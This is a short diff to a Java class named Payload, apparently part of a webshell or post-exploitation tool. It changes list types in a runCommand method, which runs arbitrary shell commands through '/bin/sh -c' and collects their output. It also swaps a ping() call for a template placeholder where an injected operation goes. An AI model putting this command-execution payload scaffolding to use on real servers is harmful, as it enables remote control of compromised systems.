@@ -116,7 +116,7 @@ public class Payload {
         return result;
     }
 
-    private LinkedList<String> runCommand(String command) throws IOException, IllegalArgumentException {
+    private ArrayList<String> runCommand(String command) throws IOException, IllegalArgumentException {
         Process p;
         Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
         if (command == null || command.length() == 0) {
@@ -127,7 +127,7 @@ public class Payload {
         } else {
             p = Runtime.getRuntime().exec(new String[] { "/bin/sh", "-c", command });
         }
-        LinkedList<String> result = new LinkedList<String>();
+        ArrayList<String> result = new ArrayList<String>();
         result.addAll(readStream(p.getInputStream(), osCharset));
         result.addAll(readStream(p.getErrorStream(), osCharset));
         return result;
@@ -152,7 +152,7 @@ public class Payload {
         HashMap<String, Object> map = new HashMap<>();
         map.put("code", 0);
         try {
-            Object data = ping(); // ETHER_GHOST_REPLACE_HERE
+            Object data = ETHER_GHOST_REPLACE_HERE
             map.put("data", data);
         } catch (Exception e) {
             map.put("code", -100);
